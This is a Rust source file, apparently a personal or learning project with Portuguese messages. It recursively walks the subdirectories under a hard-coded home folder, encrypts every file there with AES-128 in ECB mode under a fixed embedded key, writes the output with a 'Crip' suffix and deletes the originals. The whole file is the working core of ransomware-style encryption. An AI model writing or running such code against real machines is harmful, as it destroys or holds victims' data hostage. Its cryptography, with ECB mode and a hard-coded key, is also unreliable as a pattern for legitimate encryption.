use std::fs;
use std::path::{Path, PathBuf};
use aes::Aes128;
use aes::cipher::{NewBlockCipher, BlockEncrypt, generic_array::GenericArray};


const AES_BLOCK_SIZE: usize = 16;
const KEY: [u8; 16] = [
    0x00, 0x11, 0x22, 0x33,
    0x44, 0x55, 0x66, 0x77,
    0x88, 0x99, 0xAA, 0xBB,
    0xCC, 0xDD, 0xEE, 0xFF,
];

pub fn folders() -> Vec<String> {
    let root_path = Path::new("/home/tabb/Documentos/criptografar");
    let mut path: Vec<String> = Vec::new();

    find_directories(&root_path, &mut path);
    for dir in &path {
        encrypt_directory(Path::new(&dir));
    }

    path
}

fn find_directories(path: &Path, directories: &mut Vec<String>) {
    if path.is_dir() {
        match fs::read_dir(path) {
            Ok(entries) => {
                for entry in entries {
                    if let Ok(entry) = entry {
                        let path = entry.path();
                        if path.is_dir() {
                            directories.push(path.display().to_string());
                            find_directories(&path, directories);
                        }
                    }
                }
            }
            Err(e) => {
                println!("Error: {}", e);
            }
        }
    }
}

fn apply_pkcs7_padding(buffer: &mut Vec<u8>, block_size: usize) {
    let padding_len = block_size - (buffer.len() % block_size);
    buffer.extend(vec![padding_len as u8; padding_len]);
}

fn encrypt_directory(path: &Path) {
    if path.is_dir() {
        match fs::read_dir(path) {
            Ok(entries) => {
                for entry in entries {
                    if let Ok(entry) = entry {
                        let path = entry.path();
                        if path.is_file() {
                            if let Err(e) = encrypt_file(&path) {
                                println!("Erro ao criptografar arquivo {}: {}", path.display(), e);
                            }
                        }
                    }
                }
            }
            Err(e) => {
                println!("Erro ao ler o diretório {}: {}", path.display(), e);

            }
        }
    }
}

fn encrypt_file(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let mut file_data = fs::read(path)?;

    apply_pkcs7_padding(&mut file_data, AES_BLOCK_SIZE);

    let cipher = Aes128::new(&GenericArray::from_slice(&KEY));
    
    let mut encrypted_data = Vec::with_capacity(file_data.len());
    for chunk in file_data.chunks_mut(AES_BLOCK_SIZE) {
        let mut block = GenericArray::clone_from_slice(chunk);
        cipher.encrypt_block(&mut block);
        encrypted_data.extend_from_slice(&block);
    }

    let new_file_name = format!("{}Crip", path.display());
    fs::write(&new_file_name, &encrypted_data)?;
    fs::remove_file(path)?;
    println!("Arquivo criptografado e original removido: {}", path.display());

    Ok(())
}



